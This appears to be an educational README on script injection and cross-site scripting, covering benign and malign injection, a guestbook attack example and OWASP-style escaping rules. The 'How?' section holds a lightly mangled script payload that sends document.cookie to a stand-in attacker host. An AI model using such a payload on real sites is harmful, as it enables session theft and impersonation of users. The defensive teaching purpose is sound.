# Script Injection

# What?
* Code injection in general is when some code is placed (injected) into a vulnerable program.

* Much like a injecting drugs, this will have a serious effect - and this won't always be a good thing. Like injecting a local anesthetic to allow a friendly operation on your teeth :


![](http://weknowyourdreamz.com/images/teeth/teeth-01.jpg)


or a hard class A that will lead to a life of theft and no teeth, ![no teeth](http://4.bp.blogspot.com/_B1LlYh6iKqs/TLD7j0p2rsI/AAAAAAAAC-Y/CwVAtJA8MmA/s1600/rotten-teeth-6.jpg)

there are benign and malign code injections.

### Benign
* Introduce a useful new column that did not appear in the original design of a search results page.

* Offer a new way to filter, order, or group data by using a
field not exposed in the default functions of the original design.

* As with programs like Dropbox, add special parts that could be used to connect to online resources in an offline program.




### Malign

* Often disastrous!

* Change, add, or remove internal code with a possibility of doing anything.

* Steal cookies - data, passwords, session IDs etc.

* Used to set up elaborate fishing scams.

* Could even be used to propagate a worm, which could entirely destroy all the code.



# How?

* A web server has a guestbook script, which accepts small messages from users, and typically receives messages such as

--- Very nice site!

However a malicious person may know of a code injection vulnerability in the guestbook, and enters a message such as (the ## are in place of < as READme files will also ignore script tags!)

Nice site,  I think I'll take it.

--- ##script> document.location="http://some_attacker/cookie.cgi?" + document.cookie ##close/script>

If another user views the page then the injected code will be executed. This code can allow the attacker to impersonate another user. However this same software bug can be accidentally triggered by an unassuming user which will cause the website to display bad HTML code.


# Preventing XSS

Here are some rules for XSS prevention. Usually rules 1 and 2 are enough.
+ RULE 0 - Never Insert Untrusted Data Except in Allowed Locations. Never put untrusted data in the following slots:

```
<script>...NEVER PUT UNTRUSTED DATA HERE...</script>   directly in a script

<!--...NEVER PUT UNTRUSTED DATA HERE...-->             inside an HTML comment

<div ...NEVER PUT UNTRUSTED DATA HERE...=test />       in an attribute name

<NEVER PUT UNTRUSTED DATA HERE... href="/test" />   in a tag name

<style>...NEVER PUT UNTRUSTED DATA HERE...</style>   directly in CSS

```

+ RULE 1 - HTML Escape Before Inserting Untrusted Data into HTML Element Content

```
<body>...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...</body>

<div>...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...</div>

any other normal HTML elements

```
Characters to escape:

```
& --> &amp;
< --> &lt;
> --> &gt;
" --> &quot;
' --> &#x27;    
/ --> &#x2F;
```

Example checking for HTML and XML characters:

```
document.getElementById("search").addEventListener("keyup", function() {
  input = document.getElementById('search').value;
  var char = ["<",">","/","\"","\'","&"];
  var okay = true;

  // input = input.replace(/</g, "&lt;").replace(/>/g, "&gt;");
  if (input.length >= 3) {
    char.forEach(function(el){
      if(input.indexOf(el) > -1){
        okay=false;
        alert("letters only");
        return "error";

      }
    });
    if(okay===true){
      sendInputToBackEnd(input);
    }
}

```

+ RULE 2 - Attribute Escape Before Inserting Untrusted Data into HTML Common Attributes

```
<div attr=...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...>content</div>     inside UNquoted attribute

<div attr='...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...'>content</div>   inside single quoted attribute

<div attr="...ESCAPE UNTRUSTED DATA BEFORE PUTTING HERE...">content</div>   inside double quoted attribute

```

+ RULE 3 - JavaScript Escape Before Inserting Untrusted Data into JavaScript Data Values
+ RULE 4 - CSS Escape And Strictly Validate Before Inserting Untrusted Data into HTML Style Property Values
+ RULE 5 - URL Escape Before Inserting Untrusted Data into HTML URL Parameter Values
More on prevention rules [here](https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet#HTML_entity_encoding)



## References

* [XSS article](http://www.thegeekstuff.com/2012/02/xss-attack-examples/)
* [video on cross scripting](https://www.youtube.com/watch?v=OVLz6RgOjIY)
* [video on cross scripting](https://www.youtube.com/watch?v=V79Dp7i4LRM)
* [Further articles on code injection](https://en.wikipedia.org/wiki/Code_injection)
* [Article on prevention](https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet#HTML_entity_encoding)
